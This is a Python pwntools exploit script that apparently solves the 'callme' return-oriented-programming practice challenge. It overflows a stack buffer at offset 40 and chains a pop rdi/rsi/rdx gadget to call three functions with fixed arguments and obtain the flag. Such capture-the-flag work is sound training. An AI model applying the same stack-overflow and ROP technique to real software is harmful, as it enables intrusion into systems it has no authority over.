from pwn import *

elf = ELF('./callme')

callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

offset = 40

pop_rdi_rsi_rdx = 0x40093c

args_callme = [0xdeadbeefdeadbeef,
                   0xcafebabecafebabe,
                   0xd00df00dd00df00d]

p = process('./callme')

# Offset for overwrite saved rip
payload = "A" * offset

# We must call three differents functions to get the flag
# The three functions must have three same args that we can
# get in gdb. We put it in rdi, rsi and rdx
# At the third call, we get the flag

payload += p64(pop_rdi_rsi_rdx)
payload += p64(args_callme[0])
payload += p64(args_callme[1])
payload += p64(args_callme[2])
payload += p64(callme_one)

payload += p64(pop_rdi_rsi_rdx)
payload += p64(args_callme[0])
payload += p64(args_callme[1])
payload += p64(args_callme[2])
payload += p64(callme_two)

payload += p64(pop_rdi_rsi_rdx)
payload += p64(args_callme[0])
payload += p64(args_callme[1])
payload += p64(args_callme[2])
payload += p64(callme_three)

p.sendline(payload)

p.interactive()
